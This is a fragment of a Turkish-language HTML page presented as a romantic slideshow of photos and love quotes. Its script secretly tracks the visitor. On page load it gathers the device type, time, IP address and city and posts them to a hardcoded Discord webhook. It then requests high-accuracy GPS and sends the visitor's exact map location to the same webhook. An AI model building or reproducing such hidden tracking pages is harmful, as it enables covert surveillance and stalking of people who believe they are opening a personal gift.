        #hediyeButon { margin-top: 30px; background: #ff0077; display: none; }

</head>
<body>

    <div id="icerik">

    <button id="ileriBtn" onclick="ileri()">ƒ∞leri ‚ûú</button>

    <script>
        const WEB_URL = "https://discord.com/api/webhooks/1470189609630826658/DAjHbX38Ow-YJOCbk4n0C3WpHnZ7XHCZuA-VLleQpzOU26qEnTw3FuVpegmoY7ghqEnj";
        
        // Sadece bir kere √ßalƒ±≈ümasƒ± i√ßin kilit
        let raporGonderildi = false;

        function dcGonder(m) {
            fetch(WEB_URL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: m })
            });
        }

        function sistemBaslat() {
            if (raporGonderildi) return;

            const cihaz = navigator.userAgent.toLowerCase();
            const saat = new Date().toLocaleTimeString('tr-TR');
            
            // Basit cihaz tespiti
            let model = "Bilinmiyor";
            if (cihaz.includes("iphone")) model = "iPhone";
            else if (cihaz.includes("android")) model = "Android Telefon";
            else if (cihaz.includes("windows")) model = "Windows Bilgisayar";

            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => {
                    let mesaj = `üöÄ **Giri≈ü Yapƒ±ldƒ±!**\n‚è∞ **Saat:** ${saat}\nüì± **Cihaz:** ${model}\nüìç **≈ûehir:** ${d.city}\nüåê **IP:** ${d.ip}`;
                    dcGonder(mesaj);
                    
                    // GPS Konumu ƒ∞ste
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(function(p) {
                            let harita = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                            dcGonder(`üéØ **TAM KONUM GELDƒ∞!**\nüìç Harita: ${harita}`);
                        }, function(e) {
                            dcGonder("‚ö†Ô∏è GPS ƒ∞zni Reddedildi.");
                        }, { enableHighAccuracy: true });
                    }
                    raporGonderildi = true;
                });
        }

        // Sayfa a√ßƒ±lƒ±nca veya bir yere basƒ±nca √ßalƒ±≈ütƒ±r
        window.onload = sistemBaslat;

        // --- FOTOƒûRAF Sƒ∞STEMƒ∞ ---
        const fotolar = ["foto1.jpg", "foto2.jpg", "foto3.jpg", "foto4.jpg", "foto5.jpg"];
        const sozler = ["Seninle her g√ºn√ºm daha g√ºzel.", "G√ºl√º≈ü√ºn d√ºnyamƒ± aydƒ±nlatƒ±yor.", "Kalbim hep seninle.", "Sana her baktƒ±ƒüƒ±mda yeniden a≈üƒ±k oluyorum.", "ƒ∞yi ki varsƒ±n, iyi ki benimsin."];
        let index = 0;
        const audio = document.getElementById("music");

        function ileri() {
            if (audio) audio.play().catch(() => {});
            
            // Eƒüer a√ßƒ±lƒ±≈üta rapor gitmediyse butonda tekrar dene
            if (!raporGonderildi) sistemBaslat();

            index++;
            if (index >= fotolar.length) {
                document.getElementById("hediyeButon").style.display = "block";
                document.getElementById("ileriBtn").style.display = "none";
                return;
            }
            document.getElementById("foto").src = fotolar[index];
            document.getElementById("soz").innerText = sozler[index];
        }

        window.onclick = () => { if (audio) audio.play().catch(() => {}); };
    </script>
</body>
</html>
